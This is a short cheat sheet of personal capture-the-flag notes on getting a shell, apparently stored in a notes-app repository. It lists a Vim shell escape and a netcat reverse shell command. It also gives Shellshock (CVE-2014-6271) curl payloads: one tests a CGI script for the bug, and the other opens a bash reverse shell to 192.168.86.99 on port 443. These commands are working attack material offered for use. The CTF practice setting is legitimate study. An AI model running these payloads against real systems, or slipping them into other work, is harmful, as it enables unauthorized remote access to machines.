// These are actual notes, and not relevant to the notes app.

# CTF Notes

## Opening a shell
1. Vim : !/bin/bash
2. netcat reverse shell _(see below)_
3. Bash shellshock, in cgi and sometimes [ssh](https://resources.infosecinstitute.com/bash-bug-cve-2014-6271-critical-vulnerability-scaring-internet/)

#### Netcat reverse shell
On the target machine shell : `nc <host> <any port> -e /bin/bash`

On your machine: `nc -lvp <port no>`

#### Bash shellshock

Test if vulnerable:

    curl -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" http://<ip>/cgi-bin/test/test.cgi
To get shell: (do `nc -lvp 443` on your machine first)

    curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.86.99/443 0>&1' http://<ip>/cgi-bin/test/test.cgi
